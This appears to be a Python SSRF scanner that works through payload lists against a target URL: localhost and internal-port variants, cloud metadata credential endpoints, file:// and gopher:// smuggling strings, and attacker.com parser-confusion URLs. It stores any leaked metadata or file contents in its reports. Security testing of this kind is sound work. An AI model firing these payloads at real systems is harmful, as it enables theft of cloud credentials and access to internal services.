#!/usr/bin/env python3
"""
SSRF Scanner Pro — Enterprise Edition
Server-Side Request Forgery Detection and Exploitation Testing

Features:
- Internal network access detection
- Cloud metadata endpoint access
- Protocol smuggling detection
- URL parser differential analysis
- Blind SSRF with callback detection
- Bypass technique testing
"""

import os
import re
import json
import time
import random
import socket
import urllib.parse
from datetime import datetime, timezone
from typing import List, Dict, Any, Optional

import requests

# Optional colors
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except Exception:
    class _C:
        def __getattr__(self, _): return ""
    Fore = Style = _C()

# Configuration
REQUEST_TIMEOUT = 15
OUTPUT_BASE = os.path.join("reports", "ssrf")
os.makedirs(OUTPUT_BASE, exist_ok=True)

# SSRF Test Payloads
INTERNAL_TARGETS = [
    # Localhost variations
    "http://localhost",
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3000",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0",
    "http://0x7f000001",
    "http://2130706433",  # Decimal 127.0.0.1
    "http://017700000001",  # Octal 127.0.0.1
    "http://127.1",
    "http://127.0.1",
    # Internal networks
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    # Common internal services
    "http://localhost:6379",  # Redis
    "http://localhost:27017",  # MongoDB
    "http://localhost:5432",  # PostgreSQL
    "http://localhost:3306",  # MySQL
    "http://localhost:9200",  # Elasticsearch
    "http://localhost:11211",  # Memcached
]

# Cloud metadata endpoints
CLOUD_METADATA = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token",
    ],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/id",
    ],
    "oracle": [
        "http://169.254.169.254/opc/v1/instance/",
    ],
    "alibaba": [
        "http://100.100.100.200/latest/meta-data/",
    ],
}

# Bypass techniques
BYPASS_TECHNIQUES = {
    "encoding": [
        lambda url: url.replace(".", "%2e"),  # URL encode dots
        lambda url: url.replace("://", "%3a%2f%2f"),  # URL encode ://
        lambda url: urllib.parse.quote(url, safe=''),  # Full URL encode
        lambda url: urllib.parse.quote(urllib.parse.quote(url, safe=''), safe=''),  # Double encode
    ],
    "alternate_ip": [
        lambda ip: str(int.from_bytes(socket.inet_aton(ip.replace("http://", "").split("/")[0].split(":")[0]), 'big')),  # Decimal
        lambda ip: hex(int.from_bytes(socket.inet_aton(ip.replace("http://", "").split("/")[0].split(":")[0]), 'big')),  # Hex
    ],
    "dns_rebinding": [
        "http://spoofed.burpcollaborator.net",
        "http://localtest.me",  # Resolves to 127.0.0.1
        "http://127.0.0.1.nip.io",
        "http://www.127.0.0.1.nip.io",
    ],
    "url_schema": [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://localhost:11211/stat",
        "gopher://localhost:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
        "ftp://localhost",
    ],
    "parser_confusion": [
        # URL parser confusion techniques
        "http://attacker.com#@127.0.0.1",
        "http://attacker.com?@127.0.0.1",
        "http://127.0.0.1@attacker.com",
        "http://attacker.com\\@127.0.0.1",
        "http://127.0.0.1%00.attacker.com",
        "http://127.0.0.1%23@attacker.com",
    ],
}

# Common SSRF-vulnerable parameters
SSRF_PARAMS = [
    "url", "uri", "path", "dest", "destination", "redirect", "redirect_uri",
    "redirect_url", "callback", "return", "return_url", "returnUrl", "go",
    "goto", "next", "target", "to", "link", "linkurl", "domain", "host",
    "site", "html", "feed", "file", "document", "folder", "root", "dir",
    "show", "navigation", "open", "fetch", "proxy", "proxyurl", "request",
    "src", "source", "page", "pageurl", "image", "imageurl", "img",
    "picture", "reference", "ref", "data", "api", "endpoint", "service",
    "webhook", "webhookurl", "load", "include", "require", "view",
]


def utc_now():
    return datetime.now(timezone.utc)


def random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        ]),
        "Accept": "*/*",
    }


class SSRFScanner:
    def __init__(self, base_url):
        self.base = base_url.rstrip("/")
        self.session = requests.Session()
        self.findings = []
        self.vulnerable_params = []
        
    def detect_ssrf_parameters(self, html: str) -> List[str]:
        """Detect parameters that might be vulnerable to SSRF"""
        found_params = []
        
        # Check for form inputs
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\']'
        for match in re.finditer(input_pattern, html, re.IGNORECASE):
            param = match.group(1).lower()
            if any(ssrf_param in param for ssrf_param in SSRF_PARAMS):
                found_params.append(match.group(1))
                
        # Check for links with URL parameters
        href_pattern = r'href=["\'][^"\']*[?&]([^=]+)=([^"\'&]+)'
        for match in re.finditer(href_pattern, html, re.IGNORECASE):
            param = match.group(1).lower()
            value = match.group(2)
            if any(ssrf_param in param for ssrf_param in SSRF_PARAMS):
                found_params.append(match.group(1))
            elif value.startswith(("http", "//", "/")):
                found_params.append(match.group(1))
                
        return list(set(found_params))
        
    def test_internal_access(self, param: str) -> List[Dict[str, Any]]:
        """Test for internal network access via SSRF"""
        results = []
        
        for target in INTERNAL_TARGETS[:10]:  # Test first 10
            try:
                # Try GET parameter
                test_url = f"{self.base}?{param}={urllib.parse.quote(target)}"
                resp = self.session.get(test_url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=False)
                
                # Check for successful internal access indicators
                indicators = self._check_ssrf_indicators(resp, target)
                if indicators:
                    results.append({
                        "type": "INTERNAL_ACCESS",
                        "parameter": param,
                        "payload": target,
                        "method": "GET",
                        "url": test_url,
                        "status_code": resp.status_code,
                        "indicators": indicators,
                        "severity": "HIGH",
                    })
                    
                time.sleep(0.3)
                
            except requests.exceptions.Timeout:
                # Timeout might indicate internal service interaction
                results.append({
                    "type": "TIMEOUT_INDICATOR",
                    "parameter": param,
                    "payload": target,
                    "severity": "MEDIUM",
                    "note": "Request timeout - possible internal service interaction",
                })
            except Exception:
                continue
                
        return results
        
    def test_cloud_metadata(self, param: str) -> List[Dict[str, Any]]:
        """Test for cloud metadata access"""
        results = []
        
        for provider, endpoints in CLOUD_METADATA.items():
            for endpoint in endpoints[:2]:  # Test first 2 per provider
                try:
                    headers = random_headers()
                    if "google" in endpoint:
                        headers["Metadata-Flavor"] = "Google"
                        
                    test_url = f"{self.base}?{param}={urllib.parse.quote(endpoint)}"
                    resp = self.session.get(test_url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=False)
                    
                    # Check for metadata indicators
                    metadata_indicators = [
                        "ami-id" in resp.text.lower(),
                        "instance-id" in resp.text.lower(),
                        "security-credentials" in resp.text.lower(),
                        "AccessKeyId" in resp.text,
                        "SecretAccessKey" in resp.text,
                        "accountId" in resp.text,
                        "privateIp" in resp.text,
                        "computeMetadata" in resp.text,
                        resp.status_code == 200 and len(resp.text) > 0 and resp.text.strip().startswith("{"),
                    ]
                    
                    if any(metadata_indicators):
                        results.append({
                            "type": "CLOUD_METADATA_ACCESS",
                            "provider": provider.upper(),
                            "parameter": param,
                            "payload": endpoint,
                            "url": test_url,
                            "status_code": resp.status_code,
                            "severity": "CRITICAL",
                            "evidence": resp.text[:500] if resp.text else None,
                        })
                        
                    time.sleep(0.3)
                    
                except Exception:
                    continue
                    
        return results
        
    def test_protocol_smuggling(self, param: str) -> List[Dict[str, Any]]:
        """Test for protocol smuggling (file://, gopher://, etc.)"""
        results = []
        
        protocol_payloads = BYPASS_TECHNIQUES["url_schema"]
        
        for payload in protocol_payloads:
            try:
                test_url = f"{self.base}?{param}={urllib.parse.quote(payload)}"
                resp = self.session.get(test_url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=False)
                
                # Check for file disclosure indicators
                file_indicators = [
                    "root:" in resp.text,
                    "[extensions]" in resp.text,  # win.ini
                    "/bin/" in resp.text,
                    "STAT" in resp.text,  # dict protocol
                    resp.status_code == 200 and len(resp.text) > 100,
                ]
                
                if any(file_indicators):
                    results.append({
                        "type": "PROTOCOL_SMUGGLING",
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "status_code": resp.status_code,
                        "severity": "CRITICAL",
                        "evidence": resp.text[:500] if resp.text else None,
                    })
                    
                time.sleep(0.3)
                
            except Exception:
                continue
                
        return results
        
    def test_bypass_techniques(self, param: str) -> List[Dict[str, Any]]:
        """Test SSRF filter bypass techniques"""
        results = []
        base_target = "http://127.0.0.1"
        
        # Test DNS rebinding
        for payload in BYPASS_TECHNIQUES["dns_rebinding"]:
            try:
                test_url = f"{self.base}?{param}={urllib.parse.quote(payload)}"
                resp = self.session.get(test_url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=False)
                
                # IMPORTANT: Only flag 200 with actual SSRF indicators
                # 301/302 redirects are normal behavior, NOT SSRF
                if resp.status_code == 200:
                    # Check for actual internal access indicators
                    indicators = self._check_ssrf_indicators(resp, "127.0.0.1")
                    if indicators:
                        results.append({
                            "type": "DNS_REBINDING_POTENTIAL",
                            "parameter": param,
                            "payload": payload,
                            "status_code": resp.status_code,
                            "severity": "MEDIUM",
                            "indicators": indicators,
                        })
                    
            except Exception:
                continue
                
        # Test URL parser confusion
        for payload in BYPASS_TECHNIQUES["parser_confusion"]:
            try:
                test_url = f"{self.base}?{param}={urllib.parse.quote(payload)}"
                resp = self.session.get(test_url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=False)
                
                indicators = self._check_ssrf_indicators(resp, "127.0.0.1")
                if indicators:
                    results.append({
                        "type": "URL_PARSER_BYPASS",
                        "parameter": param,
                        "payload": payload,
                        "status_code": resp.status_code,
                        "severity": "HIGH",
                        "indicators": indicators,
                    })
                    
            except Exception:
                continue
                
        return results
        
    def _check_ssrf_indicators(self, resp: requests.Response, target: str) -> List[str]:
        """Check response for SSRF success indicators"""
        indicators = []
        
        # Different response from baseline
        if resp.status_code == 200:
            if "localhost" in resp.text.lower() or "127.0.0.1" in resp.text:
                indicators.append("Internal address in response")
            if "redis" in resp.text.lower() or "ERR" in resp.text:
                indicators.append("Redis service indicator")
            if "mongodb" in resp.text.lower():
                indicators.append("MongoDB service indicator")
            if "mysql" in resp.text.lower() or "mariadb" in resp.text.lower():
                indicators.append("MySQL service indicator")
            if "<title>" in resp.text and target in resp.text:
                indicators.append("Target URL reflected in HTML")
                
        # Connection refused or timeout might indicate filter bypass
        if resp.status_code in [500, 502, 503]:
            if "connection" in resp.text.lower():
                indicators.append("Connection error - possible internal access attempt")
                
        return indicators
        
    def run(self) -> Dict[str, Any]:
        """Run complete SSRF scan"""
        all_results = {
            "target": self.base,
            "timestamp": utc_now().isoformat(),
            "internal_access": [],
            "cloud_metadata": [],
            "protocol_smuggling": [],
            "bypass_techniques": [],
            "findings": [],
        }
        
        # First, get the page and detect parameters
        try:
            resp = self.session.get(self.base, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False)
            detected_params = self.detect_ssrf_parameters(resp.text)
        except Exception:
            detected_params = []
            
        # Add common SSRF params if none detected
        test_params = detected_params if detected_params else ["url", "redirect", "callback", "fetch", "proxy"]
        
        for param in test_params[:5]:  # Test max 5 params
            # Test internal access
            internal = self.test_internal_access(param)
            all_results["internal_access"].extend(internal)
            
            # Test cloud metadata
            cloud = self.test_cloud_metadata(param)
            all_results["cloud_metadata"].extend(cloud)
            
            # Test protocol smuggling
            protocol = self.test_protocol_smuggling(param)
            all_results["protocol_smuggling"].extend(protocol)
            
            # Test bypass techniques
            bypass = self.test_bypass_techniques(param)
            all_results["bypass_techniques"].extend(bypass)
            
        # Generate findings
        for vuln in all_results["cloud_metadata"]:
            self.findings.append({
                "title": f"Cloud Metadata Access via SSRF ({vuln.get('provider')})",
                "severity": "CRITICAL",
                "type": "SSRF_CLOUD_METADATA",
                "target": self.base,
                "parameter": vuln.get("parameter"),
                "payload": vuln.get("payload"),
                "evidence": vuln.get("evidence"),
                "cwe": "CWE-918",
                "owasp": "A10:2021 Server-Side Request Forgery",
            })
            
        for vuln in all_results["internal_access"]:
            if vuln.get("type") == "INTERNAL_ACCESS":
                self.findings.append({
                    "title": f"SSRF - Internal Network Access",
                    "severity": "HIGH",
                    "type": "SSRF_INTERNAL",
                    "target": self.base,
                    "parameter": vuln.get("parameter"),
                    "payload": vuln.get("payload"),
                    "indicators": vuln.get("indicators"),
                    "cwe": "CWE-918",
                })
                
        for vuln in all_results["protocol_smuggling"]:
            self.findings.append({
                "title": f"Protocol Smuggling via SSRF",
                "severity": "CRITICAL",
                "type": "SSRF_PROTOCOL",
                "target": self.base,
                "parameter": vuln.get("parameter"),
                "payload": vuln.get("payload"),
                "evidence": vuln.get("evidence"),
                "cwe": "CWE-918",
            })
            
        all_results["findings"] = self.findings
        all_results["summary"] = {
            "total_vulnerabilities": len(self.findings),
            "critical": len([f for f in self.findings if f.get("severity") == "CRITICAL"]),
            "high": len([f for f in self.findings if f.get("severity") == "HIGH"]),
            "params_tested": test_params,
        }
        
        return all_results


def main():
    import argparse
    parser = argparse.ArgumentParser(description="SSRF Scanner Pro")
    parser.add_argument("--target", "-t", required=True, help="Target URL")
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}[*] SSRF Scanner Pro - Starting scan{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Target: {args.target}{Style.RESET_ALL}")
    
    scanner = SSRFScanner(args.target)
    results = scanner.run()
    
    # Display results
    if results.get("findings"):
        print(f"\n{Fore.RED}[!] SSRF Vulnerabilities Found:{Style.RESET_ALL}")
        for finding in results["findings"]:
            color = Fore.RED if finding["severity"] == "CRITICAL" else Fore.YELLOW
            print(f"  {color}- {finding['title']} ({finding['severity']}){Style.RESET_ALL}")
            print(f"    Parameter: {finding.get('parameter')}")
            print(f"    Payload: {finding.get('payload')}")
    else:
        print(f"\n{Fore.GREEN}[+] No SSRF vulnerabilities detected{Style.RESET_ALL}")
        
    # Summary
    summary = results.get("summary", {})
    print(f"\n{Fore.CYAN}[*] Summary:{Style.RESET_ALL}")
    print(f"  Total vulnerabilities: {summary.get('total_vulnerabilities', 0)}")
    print(f"  Critical: {summary.get('critical', 0)}")
    print(f"  High: {summary.get('high', 0)}")
    
    # Save report
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = os.path.join(OUTPUT_BASE, f"ssrf_report_{ts}.json")
    with open(report_file, "w") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n{Fore.CYAN}[*] Report saved: {report_file}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
